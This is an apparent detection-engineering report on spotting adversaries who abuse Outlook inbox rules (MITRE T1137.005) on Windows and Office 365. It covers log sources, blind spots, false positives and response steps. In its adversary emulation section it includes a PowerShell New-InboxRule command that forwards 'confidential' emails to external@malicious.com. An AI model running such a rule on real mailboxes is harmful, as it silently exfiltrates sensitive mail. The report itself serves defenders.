# Alerting & Detection Strategy (ADS) Report

## Goal
The objective of this detection technique is to identify adversarial attempts to bypass security monitoring by manipulating Outlook rules on Windows and Office 365 platforms.

## Categorization
- **MITRE ATT&CK Mapping:** T1137.005 - Outlook Rules
- **Tactic / Kill Chain Phases:** Persistence
- **Platforms:** Windows, Office 365

[MITRE ATT&CK Reference](https://attack.mitre.org/techniques/T1137/005)

## Strategy Abstract
This detection strategy focuses on monitoring and analyzing configurations of Microsoft Outlook rules to detect unauthorized modifications that may be indicative of adversarial activity. The key data sources include:

- **Windows Event Logs:** Specifically, the application logs for events related to Outlook rule changes.
- **Office 365 Audit Logs:** Capture any configuration changes in user mailboxes.

Patterns analyzed involve:
- Unusual or unauthorized creation, modification, or deletion of Outlook rules.
- Changes made outside regular business hours or from unusual geographic locations.

## Technical Context
Adversaries leverage Outlook Rules to automate the redirection of emails, potentially bypassing detection mechanisms by moving sensitive information out of monitored channels. In real-world scenarios, attackers might:

1. Create a rule that forwards emails matching specific criteria (e.g., subject containing "confidential") to an external email address.
2. Modify existing rules to alter conditions or destinations without raising suspicion.

**Adversary Emulation Details:**
- Sample Command for creating an Outlook Rule:
  ```powershell
  New-InboxRule -Name "Sensitive Info Forward" -SubjectContainsWords "confidential" -ForwardTo "external@malicious.com"
  ```

## Blind Spots and Assumptions
- **Blind Spots:** Detection may miss rule changes made through alternative interfaces such as webmail, which might not generate the same event logs.
- **Assumptions:** Assumes all legitimate administrative activities are monitored and authorized; any deviation from this is treated as suspicious.

## False Positives
Potential benign activities that could trigger false alerts include:
- Legitimate IT personnel updating Outlook rules for business continuity or compliance purposes.
- Automated scripts run by users or admins to manage mailbox configurations regularly.

## Priority
**Severity: Medium**

Justification: While the exploitation of Outlook rules can facilitate data exfiltration, it requires specific knowledge and access to execute effectively. The medium priority reflects its potential impact balanced against other more prevalent threats.

## Validation (Adversary Emulation)
Currently, no adversary emulation steps are available for this technique in a test environment. Development of such scenarios is recommended to validate detection efficacy.

## Response
When an alert indicating suspicious Outlook rule activity is triggered:
1. **Immediate Verification:** Confirm the legitimacy of the change by consulting with IT administrators.
2. **Investigate Context:** Review the time, location, and user account involved in the modification.
3. **Containment Actions:** If deemed malicious, disable the offending rules and isolate affected accounts.
4. **Forensic Analysis:** Collect relevant logs and artifacts for further investigation and to identify any additional compromised systems.

## Additional Resources
Currently, no additional references or context are available beyond the MITRE ATT&CK framework provided. Further research into specific case studies or threat intelligence reports is recommended for enhanced understanding.